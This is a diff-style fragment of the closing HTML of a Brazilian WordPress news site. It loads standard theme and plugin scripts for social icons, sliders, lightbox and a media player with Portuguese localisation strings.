+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/js/shuffle/random-shuffle-min.js?ver=6.7.1" id="SFSIjqueryrandom-shuffle-js"></script>
+<script type="text/javascript" id="SFSICustomJs-js-extra">
+/* <![CDATA[ */
+var sfsi_icon_ajax_object = {"nonce":"abcad972f0","ajax_url":"https:\/\/correiodovale.com.br\/wp-admin\/admin-ajax.php","plugin_url":"https:\/\/correiodovale.com.br\/wp-content\/plugins\/ultimate-social-media-icons\/"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/plugins/ultimate-social-media-icons/js/custom.js?ver=2.9.0" id="SFSICustomJs-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/lightbox/nivo-lightbox.min.js?ver=1.2.0" id="accesspress-mag-nivolightbox-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/jquery/ui/tabs.min.js?ver=1.13.3" id="jquery-ui-tabs-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/jquery.bxslider.min.js?ver=4.1.2" id="accesspress-mag-bxslider-js-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/navigation.js?ver=20120206" id="accesspress-mag-navigation-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/skip-link-focus-fix.js?ver=20130115" id="accesspress-mag-skip-link-focus-fix-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/wow.min.js?ver=1.0.1" id="accesspress-mag-wow-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/jquery.tooltipster.min.js?ver=3.3.0" id="accesspress-mag-tooltip-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/jquery.scrollbar.min.js?ver=1.2.0" id="accesspress-mag-jScroll-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/jquery.mCustomScrollbar.min.js?ver=3.1.0" id="accesspress-mag-mscroll-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/jquery.mousewheel.min.js?ver=3.1.12" id="accesspress-mag-mousewheel-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/owl.carousel.min.js?ver=1.3.3" id="accesspress-mag-owlCarousel-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-content/themes/accesspress-mag-pro/js/custom-scripts.js?ver=1.0.1" id="accesspress-mag-custom-scripts-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/comment-reply.min.js?ver=6.7.1" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
+<script type="text/javascript" id="mediaelement-core-js-before">
+/* <![CDATA[ */
+var mejsL10n = {"language":"pt","strings":{"mejs.download-file":"Descarregar ficheiro","mejs.install-flash":"Est\u00e1 a usar um navegador sem Flash Player activado ou instalado. Por favor, active o plugin Flash Player ou descarregue a vers\u00e3o mais recente em https:\/\/get.adobe.com\/flashplayer\/.","mejs.fullscreen":"Ecr\u00e3 inteiro","mejs.play":"Reproduzir","mejs.pause":"Pausa","mejs.time-slider":"Indicador de tempo","mejs.time-help-text":"Use as setas esquerda\/direita para recuar\/avan\u00e7ar um segundo, ou use as setas baixo\/cima para recuar\/avan\u00e7ar dez segundos.","mejs.live-broadcast":"Emiss\u00e3o em directo","mejs.volume-help-text":"Use as setas cima\/baixo para aumentar ou diminuir o volume.","mejs.unmute":"Ligar som","mejs.mute":"Mudo","mejs.volume-slider":"Indicador de volume","mejs.video-player":"Reprodutor de v\u00eddeo","mejs.audio-player":"Reprodutor de \u00e1udio","mejs.captions-subtitles":"Legendas\/Legendas para surdos","mejs.captions-chapters":"Cap\u00edtulos","mejs.none":"Nenhum","mejs.afrikaans":"Africanse","mejs.albanian":"Alban\u00eas","mejs.arabic":"\u00c1rabe","mejs.belarusian":"Bielorrusso","mejs.bulgarian":"B\u00falgaro","mejs.catalan":"Catal\u00e3o","mejs.chinese":"Chin\u00eas","mejs.chinese-simplified":"Chin\u00eas (Simplificado)","mejs.chinese-traditional":"Chin\u00eas (Tradicional)","mejs.croatian":"Croata","mejs.czech":"Checo","mejs.danish":"Dinamarqu\u00eas","mejs.dutch":"Holand\u00eas","mejs.english":"Ingl\u00eas","mejs.estonian":"Estoniano","mejs.filipino":"Filipino","mejs.finnish":"Finland\u00eas","mejs.french":"Franc\u00eas","mejs.galician":"Galego","mejs.german":"Alem\u00e3o","mejs.greek":"Grego","mejs.haitian-creole":"Crioulo haitiano","mejs.hebrew":"Hebraico","mejs.hindi":"H\u00edndi","mejs.hungarian":"H\u00fangaro","mejs.icelandic":"Island\u00eas","mejs.indonesian":"Indon\u00e9sio","mejs.irish":"Irland\u00eas","mejs.italian":"Italiano","mejs.japanese":"Japon\u00eas","mejs.korean":"Coreano","mejs.latvian":"Let\u00e3o","mejs.lithuanian":"Lituano","mejs.macedonian":"Maced\u00f3nio","mejs.malay":"Malaio","mejs.maltese":"Malt\u00eas","mejs.norwegian":"Noruegu\u00eas","mejs.persian":"Persa","mejs.polish":"Polaco","mejs.portuguese":"Portugu\u00eas","mejs.romanian":"Romeno","mejs.russian":"Russo","mejs.serbian":"S\u00e9rvio","mejs.slovak":"Eslovaco","mejs.slovenian":"Esloveno","mejs.spanish":"Espanhol","mejs.swahili":"Sua\u00edli","mejs.swedish":"Su\u00e9co","mejs.tagalog":"Tagalo","mejs.thai":"Tailand\u00eas","mejs.turkish":"Turco","mejs.ukrainian":"Ucraniano","mejs.vietnamese":"Vietnamita","mejs.welsh":"Gal\u00eas","mejs.yiddish":"\u00cddiche"}};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=4.2.17" id="mediaelement-core-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/mediaelement/mediaelement-migrate.min.js?ver=6.7.1" id="mediaelement-migrate-js"></script>
+<script type="text/javascript" id="mediaelement-js-extra">
+/* <![CDATA[ */
+var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/","classPrefix":"mejs-","stretching":"responsive","audioShortcodeLibrary":"mediaelement","videoShortcodeLibrary":"mediaelement"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/mediaelement/wp-mediaelement.min.js?ver=6.7.1" id="wp-mediaelement-js"></script>
+<script type="text/javascript" src="https://correiodovale.com.br/wp-includes/js/mediaelement/renderers/vimeo.min.js?ver=4.2.17" id="mediaelement-vimeo-js"></script>
+
+</body></html>
